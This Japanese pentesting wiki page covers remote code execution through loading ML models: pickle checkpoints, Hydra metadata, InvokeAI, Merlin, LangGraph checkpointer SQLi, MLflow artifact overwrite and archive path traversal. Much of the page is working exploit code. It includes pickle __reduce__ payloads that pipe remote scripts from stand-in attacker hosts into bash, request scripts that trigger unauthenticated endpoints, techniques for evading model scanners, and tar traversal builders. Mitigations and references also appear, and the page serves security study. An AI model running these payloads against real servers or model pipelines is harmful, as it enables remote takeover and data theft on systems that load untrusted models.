# モデルの読み込みによるRCE

{{#include ../banners/hacktricks-training.md}}

## モデルの読み込みによるRCE

機械学習モデルは通常、ONNX、TensorFlow、PyTorch など、さまざまな形式で共有されます。これらのモデルは、開発者のマシンや本番システムに読み込んで使用できます。通常、モデルに悪意のあるコードが含まれているべきではありませんが、意図された機能として、あるいはモデル読み込みライブラリの脆弱性により、モデルを使ってシステム上で任意のコードを実行できる場合があります。

以下の表に、このカテゴリの代表的な脆弱性を示します。

| **フレームワーク / ツール**        | **脆弱性（該当する場合はCVE）**                                                    | **RCEの経路**                                                                                                                           | **参照**                               |
|-----------------------------|------------------------------------------------------------------------------------------------------------------------------|------------------------------------------------------------------------------------------------------------------------------------------|----------------------------------------------|
| **PyTorch** (Python)        | *`torch.load`における安全でないデシリアライゼーション* **(CVE-2025-32434)**                                                              | 悪意のあるpickleを含むモデルチェックポイントにより、コードが実行される（`weights_only`による保護を回避）                                        | |
| PyTorch **TorchServe**      | *ShellTorch* – **CVE-2023-43654**, **CVE-2022-1471**                                                                         | SSRFと悪意のあるモデルのダウンロードによりコードが実行される。管理APIにおけるJavaデシリアライゼーションRCE                                        | |
| **NVIDIA Merlin Transformers4Rec** | `torch.load`による安全でないチェックポイントのデシリアライゼーション **(CVE-2025-23298)**                                           | 信頼できないチェックポイントが`load_model_trainer_states_from_checkpoint`内でpickle reducerを呼び出し、ML worker上でコードが実行される            | [ZDI-25-833](https://www.zerodayinitiative.com/advisories/ZDI-25-833/)<sup>[[6]](#references)</sup> |
| **LangGraph** (SQLite/Redis checkpointers) | SQLiと安全でないMessagePack拡張フック **(CVE-2025-67644, CVE-2026-28277, CVE-2026-27022)** | ユーザーが制御する`filter`キーによりSQL/JSON-path構文が注入され、`UNION SELECT`で偽のcheckpoint行が生成される。その後、`msgpack`のデシリアライゼーションが攻撃者の選んだPythonコードをインポートして呼び出す | [Check Point 2026](https://research.checkpoint.com/2026/from-sqli-to-rce-exploiting-langgraphs-checkpointer/) |
| **TensorFlow/Keras**        | **CVE-2021-37678**（安全でないYAML） <br> **CVE-2024-3660**（Keras Lambda）                                                      | YAMLからモデルを読み込む際に`yaml.unsafe_load`が使われる（コード実行） <br> **Lambda**レイヤーを含むモデルを読み込むと、任意のPythonコードが実行される          | |
| TensorFlow (TFLite)         | **CVE-2022-23559**（TFLiteのパース処理）                                                                                          | 細工された`.tflite`モデルが整数オーバーフローを引き起こし、ヒープ破損につながる（RCEの可能性あり）                                                      | |
| **Scikit-learn** (Python)   | **CVE-2020-13092**（joblib/pickle）                                                                                           | `joblib.load`でモデルを読み込む際に、攻撃者の`__reduce__`ペイロードを含むpickleが実行される                                                   | |
| **NumPy** (Python)          | **CVE-2019-6446**（安全でない`np.load`）*異論あり*                                                                              | `numpy.load`はデフォルトでpickle化されたオブジェクト配列を許可していたため、悪意のある`.npy/.npz`がコード実行を引き起こす                                            | |
| **ONNX / ONNX Runtime**     | **CVE-2022-25882**（ディレクトリトラバーサル） <br> **CVE-2024-5187**（tarトラバーサル）                                                    | ONNXモデルの外部重みのパスがディレクトリ外を参照できる（任意のファイルを読み取り） <br> 悪意のあるONNXモデルのtarが任意のファイルを上書きする（RCEにつながる） | |
| ONNX Runtime (設計上のリスク)  | *(CVEなし)* ONNXのカスタムops / 制御フロー                                                                                    | カスタムoperatorを含むモデルでは、攻撃者のネイティブコードの読み込みが必要となる。複雑なモデルグラフを悪用して、意図しない処理を実行できる   | |
| **NVIDIA Triton Server**    | **CVE-2023-31036**（パストラバーサル）                                                                                          | `--model-control`を有効にしてmodel-load APIを使うと、相対パスによるトラバーサルでファイルを書き込める（RCE目的で`.bashrc`を上書きするなど）    | |
| **GGML (GGUF format)**      | **CVE-2024-25664 … 25668**（複数のヒープオーバーフロー）                                                                         | 不正なGGUFモデルファイルがparserでヒープバッファオーバーフローを引き起こし、被害者のシステム上で任意のコードを実行できる                     | |
| **Keras (旧形式)**   | *(新たなCVEなし)* Legacy Keras H5 model                                                                                         | Lambdaレイヤーを含む悪意のあるHDF5（`.h5`）モデルは、読み込み時に依然としてコードを実行する（Kerasのsafe_modeは旧形式を対象としていないため、「downgrade attack」となる） | |
| **その他**（一般）        | *設計上の欠陥* – Pickle serialization                                                                                         | 多くのMLツール（pickleベースのモデル形式やPythonの`pickle.load`など）は、対策がなければモデルファイルに埋め込まれた任意のコードを実行する | |
| **NeMo / uni2TS / FlexTok (Hydra)** | 信頼できないメタデータが`hydra.utils.instantiate()`に渡される **(CVE-2025-23304, CVE-2026-22584, FlexTok)** | 攻撃者が制御するモデルのメタデータ/configで`_target_`を任意のcallable（例：`builtins.exec`）に設定すると、「安全な」形式（`.safetensors`、`.nemo`、リポジトリの`config.json`）であっても、読み込み時に実行される | [Unit42 2026](https://unit42.paloaltonetworks.com/rce-vulnerabilities-in-ai-python-libraries/) |

さらに、[PyTorch](https://github.com/pytorch/pytorch/security)で使われるものなど、Pythonのpickleベースのモデルには、`weights_only=True`で読み込まない場合に、システム上で任意のコードを実行できるものがあります。そのため、上記の表に記載されていなくても、pickleベースのモデルはこの種の攻撃に特に脆弱な可能性があります。

### pickleベースのチェックポイントに対する静的チェックの回避

制限のない`pickle.load()`、`joblib.load()`、または`torch.load(..., weights_only=False)`を呼び出すモデル読み込み処理は、単なるparserではなく、コード実行につながるシンクです。<sup>[[22]](#references)</sup> PyTorch 2.6では、カスタムpickleモジュールが指定されていない場合、`torch.load()`はデフォルトで`weights_only=True`になります。以下の例で未サポートのオブジェクトを読み込むには、制限のないloaderを使うか、アプリケーション側でこの保護を無効にする必要があります。<sup>[[4]](#references)</sup> 静的スキャンで問題が検出されなかったとしても、この境界は変わりません。<sup>[[21]](#references)</sup>

基本的な`__reduce__`プリミティブについては[Python pickle deserialization](../pentesting-web/deserialization/#pickle)を、実行時のインポートチェックについては[Fickling's ML import allowlist](keras-model-deserialization-rce-and-gadget-hunting.md#ml-pickle-import-allowlisting-for-aiml-models-fickling)を参照してください。

#### callableを登録し、後から`EXT2`で解決する

pickleは`REDUCE`を通じて`copyreg.add_extension`を呼び出し、攻撃者が選んだ数値のextension codeに対して、モジュール名と名前のペアを登録できます。後続の`EXT2`がそのコードをcallableに解決し、別の`REDUCE`で呼び出すことができます。したがって、重要なcallableは`GLOBAL`や`STACK_GLOBAL` opcodeの引数ではありません。Binarlyは`multiprocessing.util.spawnv_passfds`を使ってこれを実証しました。評価対象となった5つのscannerのうち4つが検出できず、SaferPickleは検出しました。レジストリの変更と`EXT2`による解決は、同じunpickle処理内で発生します。<sup>[[21]](#references)[[22]](#references)</sup>

```text
GLOBAL       'copyreg add_extension'
BINUNICODE   'multiprocessing.util'
BINUNICODE   'spawnv_passfds'
BININT2      31337
TUPLE3
REDUCE       # register the extension
POP
EXT2         31337  # resolve the callable
# Push its arguments, then REDUCE to call it
```

これは opcode の概略であり、完全な checkpoint ではありません。外側の loader は周囲の pickle stream を受け付ける必要があります。危険な callable を探すために `GLOBAL` の operand だけを検索する scanner では、後続の lookup を見落とします。`EXT2` に対応していない scanner は、判定を出す前に失敗する可能性があります。厳格な allowlist では、`copyreg.add_extension` 自体が拒否されることもあります。<sup>[[21]](#references)</sup>

#### 構築された code-object 型を通常の関数の背後に隠す

別の pickle chain では、`type(copy.copy)` から `FunctionType` を、`type(copy.copy.__code__)` から `CodeType` を取得し、与えられた bytecode から code object を構築して関数としてラップし、実行できます。公開された variant は `operator.methodcaller('__getattribute__', '__code__')` を通じて `__code__` を取得するため、pickle でどちらの constructor も名前を指定して import する必要がありません。その `CodeType(...)` のフィールド配置と bytecode は CPython のバージョンに依存します。別の interpreter 向けに作られた payload は、実行前に失敗する可能性があります。SaferPickle は実証された sample を検出しましたが、判定を `suspicious` に引き下げました。評価対象となった他の 4 つの scanner は見落としました。<sup>[[21]](#references)[[22]](#references)</sup>

```python
from copy import copy
from operator import methodcaller
function_type = type(copy)
code_type = type(methodcaller('__getattribute__', '__code__')(copy))
# REDUCE can construct code_type(...) and function_type(code, {})
```

#### pickle引数から2つ目のモデル読み込みをトリガーする

外側のpickleは、攻撃者が用意したシリアライズ済みモデルを引数として、`torch.storage._load_from_bytes`を呼び出せます。この関数は`torch.load(io.BytesIO(b), weights_only=False)`を呼び出すため、トップレベルのopcodeスキャナーには1つの呼び出し可能オブジェクトに渡されたバイト列として見えていても、ネストされたモデルはweights-onlyの制限なしにデシリアライズされます。ただし、外側のロードでもその呼び出し可能オブジェクトを許可する必要があります。`weights_only=True`を指定しても、外側のpickleが自動的にそれを受け入れるわけではありません。ネストされたバイト列を再帰的に調べないスキャナーは、内側の`GLOBAL`/`REDUCE`チェーンを見落とす可能性があります。<sup>[[21]](#references)[[23]](#references)</sup>

#### ロード時に旧式のpickleモジュール名を解決する

pickle protocol 3未満では、Pythonのデフォルト設定`fix_imports=True`により、`GLOBAL`参照の`commands.run`は`_compat_pickle.IMPORT_MAPPING`を介して`subprocess.run`にマッピングされます。そのため、モジュール名の文字列をそのまま`subprocess`のdenylistと比較するスキャナーは、実行時に呼び出されるオブジェクトを見落とす可能性があります。これには、互換性マッピングを維持し、結果として得られる呼び出し引数を受け入れるローダーが必要です。<sup>[[21]](#references)[[24]](#references)[[25]](#references)</sup>

#### ZIP以外のcheckpointをZIP専用スキャナーに見逃させる

形式の判定はopcodeの検査とは別に失敗することがあります。Binarlyの報告によると、ModelScan 0.8.8は`.bin`、`.pt`、`.pth`、`.ckpt`ファイルをZIP専用のPyTorchスキャナーに振り分け、非ZIPのpickleストリームを通常のpickleスキャナーにフォールバックさせずにスキップしていました。また、`torch.load()`は受け入れるものの、ModelScanとJFrogが検査しなかった旧式のTARモデルレイアウトについても記載されています。これらはスキャナーのバージョン固有の欠落であり、すべてのモデルスキャナーに当てはまる性質ではありません。<sup>[[21]](#references)</sup>

#### 静的パーサーが不正な末尾に到達する前に実行する

`pickletools.genops()`でpickle全体を走査するスキャナーは、有効な`REDUCE`の後に切り詰められたopcodeがあると例外を発生させることがあります。制限のないunpicklerは、その末尾に遭遇する前にすでに呼び出し可能オブジェクトを実行しており、最終的にロード全体が例外で終了する場合も同様です。報告されたサンプルでは、実行される`REDUCE`の直後に切り詰められた`BINUNICODE`を置いており、それ以前にファイル書き込みの副作用が発生した後で`pickletools.genops()`が失敗しました。この手法でスキャナーを回避できるのは、スキャナーがパースエラーを問題なしとして扱うか、ファイルをスキップする場合に限られます。モデルが正常に返されなくても副作用が重要な場合にのみ有効です。ロードの完了を必要とするターゲットは、この成果物を拒否する可能性があります。<sup>[[21]](#references)</sup>

### Hydra metadata → RCE（safetensorsでも有効）

`hydra.utils.instantiate()`は、設定またはmetadataオブジェクト内の、ドット区切りの任意の`_target_`をインポートして呼び出します。Hugging Face Transformersなどのライブラリが**信頼できないモデルmetadata**を`instantiate()`に渡す場合、攻撃者はモデルのロード中に即座に実行される呼び出し可能オブジェクトと引数を指定できます（pickleは不要です）。<sup>[[11]](#references)</sup><sup>[[12]](#references)</sup><sup>[[13]](#references)</sup>

payloadの例（`.nemo`の`model_config.yaml`、repoの`config.json`、または`.safetensors`内の`__metadata__`で動作）:

```yaml
_target_: builtins.exec
_args_:
  - "import os; os.system('curl http://ATTACKER/x|bash')"
```

主なポイント:
- NeMo の `restore_from/from_pretrained`、uni2TS HuggingFace coders、FlexTok loaders では、モデルの初期化前にトリガーされる。
- Hydra の文字列ブロックリストは、別の import パス（例: `enum.bltns.eval`）や、アプリケーションが解決する名前（例: `nemo.core.classes.common.os.system` → `posix`）を使って回避できる。<sup>[[14]](#references)</sup>
- FlexTok は `ast.literal_eval` で文字列化されたメタデータも解析するため、Hydra の呼び出し前に DoS（CPU／メモリの急激な消費）が発生する可能性がある。

### 🆕  `torch.load` による InvokeAI RCE（CVE-2024-12029）

`InvokeAI` は、Stable-Diffusion 向けの人気のオープンソース Web インターフェースです。バージョン **5.3.1 – 5.4.2** では、任意の URL からモデルをダウンロードして読み込める REST endpoint `/api/v2/models/install` が公開されています。<sup>[[1]](#references)</sup>

内部では、この endpoint は最終的に次を呼び出します:

```python
checkpoint = torch.load(path, map_location=torch.device("meta"))
```

指定されたファイルが**PyTorch checkpoint (`*.ckpt`)**の場合、`torch.load`は**pickle deserialization**を実行します。内容はユーザーが制御するURLから直接取得されるため、攻撃者はcheckpoint内にカスタム`__reduce__`メソッドを持つ悪意のあるオブジェクトを埋め込めます。このメソッドは**deserialization中に**実行され、InvokeAIサーバー上で**remote code execution (RCE)**につながります。

この脆弱性には**CVE-2024-12029**（CVSS 9.8、EPSS 61.17 %）が割り当てられました。

#### Exploitationの手順

1. 悪意のあるcheckpointを作成する:

```python
# payload_gen.py
import pickle, torch, os

class Payload:
    def __reduce__(self):
        return (os.system, ("/bin/bash -c 'curl http://ATTACKER/pwn.sh|bash'",))

with open("payload.ckpt", "wb") as f:
    pickle.dump(Payload(), f)
```

2. `payload.ckpt`を自分が管理するHTTPサーバー上でホストします（例: `http://ATTACKER/payload.ckpt`）。
3. 脆弱なエンドポイントをトリガーします（認証不要）:

```python
import requests

requests.post(
    "http://TARGET:9090/api/v2/models/install",
    params={
        "source": "http://ATTACKER/payload.ckpt",  # remote model URL
        "inplace": "true",                         # write inside models dir
        # the dangerous default is scan=false → no AV scan
    },
    json={},                                         # body can be empty
    timeout=5,
)
```

4. InvokeAI がファイルをダウンロードすると `torch.load()` を呼び出し、`os.system` gadget が実行され、攻撃者は InvokeAI プロセスのコンテキストでコード実行を取得します。

既成の exploit: **Metasploit** module `exploit/linux/http/invokeai_rce_cve_2024_12029` が一連の処理全体を自動化します。<sup>[[3]](#references)</sup>

#### 条件

•  InvokeAI 5.3.1-5.4.2（scan flag のデフォルトは **false**）
•  `/api/v2/models/install` に攻撃者がアクセスできる
•  プロセスに shell command を実行する権限がある

#### 緩和策

* **InvokeAI ≥ 5.4.3** にアップグレードする – patch によりデフォルトで `scan=True` が設定され、deserialization 前に malware scanning が実行されます。<sup>[[2]](#references)</sup>
* checkpoint をプログラムから読み込む場合は、`torch.load(file, weights_only=True)` または新しい [`torch.load_safe`](https://pytorch.org/docs/stable/serialization.html#security) helper を使用します。
* model source と署名に allow-list を適用し、最小権限で service を実行します。

> ⚠️ 信頼できない source から deserialization する場合、Python の pickle ベースの形式（多くの `.pt`、`.pkl`、`.ckpt`、`.pth` ファイルを含む）は**すべて**本質的に安全ではないことを忘れないでください。

---

古い InvokeAI バージョンを reverse proxy の背後で稼働させ続ける必要がある場合の、場当たり的な緩和策の例:

```nginx
location /api/v2/models/install {
    deny all;                       # block direct Internet access
    allow 10.0.0.0/8;               # only internal CI network can call it
}
```

### 🆕 NVIDIA Merlin Transformers4Rec における unsafe `torch.load` 経由の RCE (CVE-2025-23298)

NVIDIA の Transformers4Rec（Merlin の一部）には、ユーザー指定のパスに対して `torch.load()` を直接呼び出す unsafe な checkpoint loader がありました。`torch.load` は Python の `pickle` に依存しているため、攻撃者が制御する checkpoint は、デシリアライズ中に reducer を介して任意のコードを実行できます。<sup>[[5]](#references)</sup>

脆弱なパス（修正前）: `transformers4rec/torch/trainer/trainer.py` → `load_model_trainer_states_from_checkpoint(...)` → `torch.load(...)`。

RCE につながる理由: Python の pickle では、オブジェクトが callable と引数を返す reducer（`__reduce__`/`__setstate__`）を定義できます。unpickle 中にその callable が実行されます。このようなオブジェクトが checkpoint に含まれていると、重みが使われる前に実行されます。

最小限の悪意ある checkpoint の例:

```python
import torch

class Evil:
    def __reduce__(self):
        import os
        return (os.system, ("id > /tmp/pwned",))

# Place the object under a key guaranteed to be deserialized early
ckpt = {
    "model_state_dict": Evil(),
    "trainer_state": {"epoch": 10},
}

torch.save(ckpt, "malicious.ckpt")
```

配布経路と影響範囲:
- repo、bucket、artifact registry 経由で共有されるトロイの木馬化された checkpoint/model
- checkpoint を自動ロードする、自動化された resume/deploy pipeline
- 実行は training/inference worker 内で行われ、多くの場合、root などの高い権限で動作する（例: container 内の root）

修正: Commit [b7eaea5](https://github.com/NVIDIA-Merlin/Transformers4Rec/pull/802/commits/b7eaea527d6ef46024f0a5086bce4670cc140903)（PR #802）では、直接の `torch.load()` を、`transformers4rec/utils/serialization.py` に実装された、制限付きの許可リスト方式の deserializer に置き換えました。新しい loader は型とフィールドを検証し、load 時に任意の callable が呼び出されるのを防ぎます。<sup>[[7]](#references)</sup>

PyTorch checkpoint に特化した防御ガイダンス:
- 信頼できないデータを unpickle しないでください。可能であれば、[Safetensors](https://huggingface.co/docs/safetensors/index) や ONNX などの実行可能コードを含まない形式を優先してください。
- PyTorch serialization を使用する必要がある場合は、`weights_only=True`（新しい PyTorch でサポート）を指定するか、Transformers4Rec の patch と同様の、許可リスト方式のカスタム unpickler を使用してください。<sup>[[4]](#references)</sup>
- model の出所と署名を検証し、deserialization を sandbox 化してください（seccomp/AppArmor、非 root ユーザー、制限された FS、ネットワークへの送信を禁止）。
- checkpoint の load 時に、ML service から予期しない child process が起動していないか監視し、`torch.load()`/`pickle` の使用状況を追跡してください。

POC と脆弱性／patch の参照:<sup>[[8]](#references)</sup><sup>[[9]](#references)</sup><sup>[[10]](#references)</sup>
- patch 前の脆弱な loader: https://gist.github.com/zdi-team/56ad05e8a153c84eb3d742e74400fd10.js<sup>[[8]](#references)</sup>
- 悪意のある checkpoint の POC: https://gist.github.com/zdi-team/fde7771bb93ffdab43f15b1ebb85e84f.js<sup>[[9]](#references)</sup>
- patch 後の loader: https://gist.github.com/zdi-team/a0648812c52ab43a3ce1b3a090a0b091.js<sup>[[10]](#references)</sup>

## 例 – 悪意のある PyTorch model の作成

- model を作成する:

```python
# attacker_payload.py
import torch
import os

class MaliciousPayload:
    def __reduce__(self):
        # This code will be executed when unpickled (e.g., on model.load_state_dict)
        return (os.system, ("echo 'You have been hacked!' > /tmp/pwned.txt",))

# Create a fake model state dict with malicious content
malicious_state = {"fc.weight": MaliciousPayload()}

# Save the malicious state dict
torch.save(malicious_state, "malicious_state.pth")
```

- モデルをロードする:

```python
# victim_load.py
import torch
import torch.nn as nn

class MyModel(nn.Module):
    def __init__(self):
        super().__init__()
        self.fc = nn.Linear(10, 1)

model = MyModel()

# ⚠️ This will trigger code execution from pickle inside the .pth file
model.load_state_dict(torch.load("malicious_state.pth", weights_only=False))

# /tmp/pwned.txt is created even if you get an error
```

### Deserialization Tencent FaceDetection-DSFD resnet (CVE-2025-13715 / ZDI-25-1183)

Tencent’s FaceDetection-DSFD は、ユーザー制御データをデシリアライズする `resnet` endpoint を公開しています。ZDI は、リモート攻撃者が被害者に悪意あるページ／ファイルを読み込ませ、細工したシリアライズ済みデータをその endpoint に送信させることで、`root` 権限でデシリアライズを実行させ、完全な侵害に至ることを確認しました。

この exploit の流れは、一般的な pickle の悪用と同様です。

```python
import pickle, os, requests

class Payload:
    def __reduce__(self):
        return (os.system, ("curl https://attacker/p.sh | sh",))

blob = pickle.dumps(Payload())
requests.post("https://target/api/resnet", data=blob,
              headers={"Content-Type": "application/octet-stream"})
```

デシリアライズ中に到達可能な gadget（コンストラクター、`__setstate__`、フレームワークのコールバックなど）は、通信手段が HTTP、WebSocket、または監視対象ディレクトリに置かれたファイルのいずれであっても、同じ方法で weaponize できます。



### LangGraph checkpointer SQLi → MessagePack RCE

この攻撃チェーンが興味深いのは、攻撃者が**悪意のあるモデルファイルをアップロードする必要がない**点です。代わりに、アプリケーションが**AIエージェントの永続化 API**（`get_state_history(..., filter=...)`）を公開しており、ユーザー入力が checkpointer のクエリビルダーに渡されます。

#### 1. メタデータフィルターにおける構造的 SQLi

脆弱な SQLite のパターンは次のようなものでした。

```python
for query_key, query_value in filter.items():
    operator, param_value = _where_value(query_value)
    predicates.append(
        f"json_extract(CAST(metadata AS TEXT), '$.{query_key}') {operator}"
    )
```

値は後でバインドされますが、`query_key` は **JSON path string** に連結されるため、辞書キー内の `'` によって `'$.{query_key}'` から抜け出し、SQLを注入できます。同じ教訓は **JSON paths、識別子、演算子、`LIMIT`、TTL fields** にも当てはまります。プレースホルダーが保護するのは値だけであり、クエリ構文の構造部分は保護しません。

#### 2. `UNION SELECT` はデータ窃取だけでなく、後続のsinkも標的にできる

このクエリは `type` とシリアライズされた `checkpoint` bytes を返し、これらは後で次のように消費されます:

```python
self.serde.loads_typed((type, checkpoint))
```

つまり、`WHERE`句のSQLiで**偽の結果行**を注入できます。

```sql
UNION SELECT 'thread1', 'ns', 'checkpoint1', NULL, 'msgpack', X'<payload>', '{}'
```

後続のコードが選択したカラムを解析、deserialize、書き込み、または実行する場合は、それらのカラムを対応する sink にマッピングしてください。このケースでは、偽の行によって SQLi が**攻撃者制御の deserialization**に変わります。

#### 3. Unsafe MessagePack extension hooks は code gadgets と同等

LangGraph の `msgpack` パスでは、ネストされたタプルを unpack して次を実行するカスタム extension hook が使われていました:

```python
getattr(importlib.import_module(tup[0]), tup[1])(tup[2])
```

したがって、`("os", "system", "id > /tmp/pwned")` と同等の内容をエンコードした MessagePack extension object は、`os` を import し、`system` を解決してコマンドを実行します。AI framework を監査する際は、動的 import、reflection、または任意の callable dispatch を行う **custom MessagePack/JSON/pickle revivers** を調べてください。

#### 4. agent framework の実践的な監査パターン

ユーザーが制御できる入力が次の箇所に渡される場合は、確認してください。
- state history / memory / replay / checkpoint の一覧取得 API
- SQL または Redis の query fragment を生成する構造化 filter builder
- custom deserializer（`pickle`、`msgpack`、`json` object hook、YAML constructor）
- persistence layer が返す行を信頼する復旧処理

この具体的な chain は、信頼できないユーザーが `filter` を制御できる場合に、**SQLite** または **Redis** の checkpointer を使う self-hosted LangGraph deployment に影響しました。開示時点で記載された修正済みバージョンは `langgraph-checkpoint-sqlite 3.0.1+`、`langgraph 1.0.10+`、`langgraph-checkpoint-redis 1.0.2+`、`langgraph-checkpoint 4.0.1+` です。<sup>[[15]](#references)</sup>

### MLflow PyFunc artifact の上書きによる pickle RCE

`PythonModel` から作成された MLflow PyFunc は、シリアライズされた object を `python_model.pkl` として保存できます。model metadata は `mlflow.pyfunc.model` を loader として指定し、MLflow の実装は保存された Python model にこのファイル名を使用します。その結果、artifact store への書き込み権限が、後から model を読み込む別の application での code execution につながる可能性があります。<sup>[[17]](#references)[[18]](#references)</sup>

有効な chain は **artifact の書き込み権限 → pickle の置き換え → inference consumer に再読み込みさせる** です。`mlflow-artifacts:/...` を root とする proxied experiment では、experiment、run、model の artifact path を列挙します。tracking server は `/api/2.0/mlflow-artifacts/artifacts/<artifact-path>` に対する `GET` と `PUT` を公開しています。<sup>[[19]](#references)[[20]](#references)</sup>

```bash
# Preserve a copy and confirm the exact object first
curl -u USER:PASS \
  'http://MLFLOW/api/2.0/mlflow-artifacts/artifacts/EXP/RUN/artifacts/model/python_model.pkl' \
  -o original.pkl

# Upload the pickle without curl transforming its bytes
curl -u USER:PASS -X PUT \
  'http://MLFLOW/api/2.0/mlflow-artifacts/artifacts/EXP/RUN/artifacts/model/python_model.pkl' \
  --data-binary @payload.pkl
```

最小限のreducerを使うと、consumerがartifactをunpickleした直後にコマンドを実行できます。`MLmodel`で宣言されているPythonバージョンでpayloadを生成すれば、互換性の問題を回避できます。<sup>[[17]](#references)[[20]](#references)</sup>

```python
import os
import pickle

class Payload:
    def __reduce__(self):
        return os.system, ("ping -c 1 ATTACKER",)

with open("payload.pkl", "wb") as f:
    pickle.dump(Payload(), f)
```

既存のmodelを**読み込む**操作（予測、スコアリング、デプロイなど）を実行します。先に再トレーニングしないでください。トレーニングによって、悪意のあるartifactが新しいmodelに置き換えられる可能性があります。アプリケーションエラーが発生しても、exploitが成立していないとは限りません。reducerは、使用可能なmodelではなく、コマンドの整数の終了ステータスを返します。まずはICMPやHTTP callbackなど、観測可能な副作用から始め、その後、最終的なpayloadに置き換えてください。<sup>[[20]](#references)</sup>

評価時には、runを作成する権限と、別のrunに属するartifactを上書きする権限を区別してください。認証とrunごとの更新権限を確認し、`python_model.pkl`への予期しない変更を調べ、modelの来歴と完全性を実行境界の一部として扱ってください。現在のMLflowのコードでは`MLFLOW_ALLOW_PICKLE_DESERIALIZATION=false`の設定もサポートされており、cloudpickleデータを読み込む代わりにmodels-from-code artifactを使うことが推奨されています。<sup>[[18]](#references)[[19]](#references)[[20]](#references)</sup>

### 公開されたmodelサーバーとMLインフラ

悪意のあるmodelの読み込みだけが、MLインフラ上でコードを実行する方法ではありません。Job submission API、コード検証endpoint、セルフホスト型AIサービスによるmodel registryからのpullも、model fileを使わずにコード実行につながる可能性があります。[公開されたセルフホスト型AIサービス](AI-Exposed-Self-Hosted-AI-Services.md)を参照してください。

## モデルを利用した Path Traversal

[**このブログ記事**](https://blog.huntr.com/pivoting-archive-slip-bugs-into-high-value-ai/ml-bounties)で解説されているように、さまざまなAI frameworkで使われるmodel formatの多くは、通常`.zip`のようなarchiveをベースにしています。そのため、これらのformatを悪用してPath Traversal攻撃を行い、modelが読み込まれるシステム上の任意のファイルを読み取れる可能性があります。<sup>[[16]](#references)</sup>

たとえば、以下のコードを使うと、読み込み時に`/tmp`ディレクトリ内にファイルを作成するmodelを作成できます。

```python
import tarfile

def escape(member):
    member.name = "../../tmp/hacked"     # break out of the extract dir
    return member

with tarfile.open("traversal_demo.model", "w:gz") as tf:
    tf.add("harmless.txt", filter=escape)
```

または、以下のコードを使うと、ロード時に `/tmp` ディレクトリへのシンボリックリンクを作成するモデルを作成できます：

```python
import tarfile, pathlib

TARGET  = "/tmp"        # where the payload will land
PAYLOAD = "abc/hacked"

def link_it(member):
    member.type, member.linkname = tarfile.SYMTYPE, TARGET
    return member

with tarfile.open("symlink_demo.model", "w:gz") as tf:
    tf.add(pathlib.Path(PAYLOAD).parent, filter=link_it)
    tf.add(PAYLOAD)                      # rides the symlink
```

### 深掘り: Keras .keras のデシリアライズと gadget 探索

.keras の内部構造、Lambda layer の RCE、≤ 3.8 における任意 import の問題、および修正後の allowlist 内での gadget 発見について、詳しくは次のガイドを参照してください:


{{#ref}}
keras-model-deserialization-rce-and-gadget-hunting.md
{{#endref}}

## References

- [1] [OffSec blog – 「CVE-2024-12029 – InvokeAI における信頼できないデータのデシリアライズ」](https://www.offsec.com/blog/cve-2024-12029/)
- [2] [InvokeAI のパッチコミット 756008d](https://github.com/invoke-ai/invokeai/commit/756008dc5899081c5aa51e5bd8f24c1b3975a59e)
- [3] [Rapid7 Metasploit モジュールのドキュメント](https://www.rapid7.com/db/modules/exploit/linux/http/invokeai_rce_cve_2024_12029/)
- [4] [PyTorch – torch.load のセキュリティに関する考慮事項](https://pytorch.org/docs/stable/notes/serialization.html#security)
- [5] [ZDI blog – CVE-2025-23298: NVIDIA Merlin でのリモートコード実行](https://www.thezdi.com/blog/2025/9/23/cve-2025-23298-getting-remote-code-execution-in-nvidia-merlin)
- [6] [ZDI のアドバイザリ: ZDI-25-833](https://www.zerodayinitiative.com/advisories/ZDI-25-833/)
- [7] [Transformers4Rec のパッチコミット b7eaea5 (PR #802)](https://github.com/NVIDIA-Merlin/Transformers4Rec/pull/802/commits/b7eaea527d6ef46024f0a5086bce4670cc140903)
- [8] [パッチ適用前の脆弱な loader (gist)](https://gist.github.com/zdi-team/56ad05e8a153c84eb3d742e74400fd10.js)
- [9] [悪意のある checkpoint の PoC (gist)](https://gist.github.com/zdi-team/fde7771bb93ffdab43f15b1ebb85e84f.js)
- [10] [パッチ適用後の loader (gist)](https://gist.github.com/zdi-team/a0648812c52ab43a3ce1b3a090a0b091.js)
- [11] [Hugging Face Transformers](https://github.com/huggingface/transformers)
- [12] [Unit 42 – 最新の AI/ML フォーマットとライブラリにおけるリモートコード実行](https://unit42.paloaltonetworks.com/rce-vulnerabilities-in-ai-python-libraries/)
- [13] [Hydra instantiate のドキュメント](https://hydra.cc/docs/advanced/instantiate_objects/overview/)
- [14] [Hydra の block-list コミット (RCE に関する警告)](https://github.com/facebookresearch/hydra/commit/4d30546745561adf4e92ad897edb2e340d5685f0)
- [15] [Check Point Research – SQLi から RCE へ: LangGraph の Checkpointer を悪用する](https://research.checkpoint.com/2026/from-sqli-to-rce-exploiting-langgraphs-checkpointer/)
- [16] [Archive Slip のバグを高価値な AI/ML バウンティにつなげる](https://blog.huntr.com/pivoting-archive-slip-bugs-into-high-value-ai/ml-bounties)
- [17] [Snyk のアドバイザリと PyFunc の概念実証 – CVE-2024-37054](https://security.snyk.io/vuln/SNYK-PYTHON-MLFLOW-7210300)
- [18] [MLflow ソース – PyFunc の `model.py`](https://github.com/mlflow/mlflow/blob/master/mlflow/pyfunc/model.py)
- [19] [MLflow REST API – artifact のダウンロードとアップロード用エンドポイント](https://mlflow.org/docs/latest/api_reference/rest-api.html)
- [20] [0xdf – HTB: SmartHire](https://0xdf.gitlab.io/2026/09/26/htb-smarthire.html)
- [21] [Binarly MLTracer の静的スキャナー回避手法の分類](https://raw.githubusercontent.com/binarly-io/ai-supply-chain-attacks-research/master/MLTracer/evasion.md)
- [22] [Binarly – MLTracer による悪意のあるモデルの検出](https://binarly.io/blog/malicious-model-detection-mltracer)
- [23] [PyTorch storage の `_load_from_bytes` 実装](https://raw.githubusercontent.com/pytorch/pytorch/main/torch/storage.py)
- [24] [CPython pickle の `find_class` 互換性マッピング](https://raw.githubusercontent.com/python/cpython/main/Lib/pickle.py)
- [25] [CPython `_compat_pickle` の import マッピング](https://raw.githubusercontent.com/python/cpython/main/Lib/_compat_pickle.py)
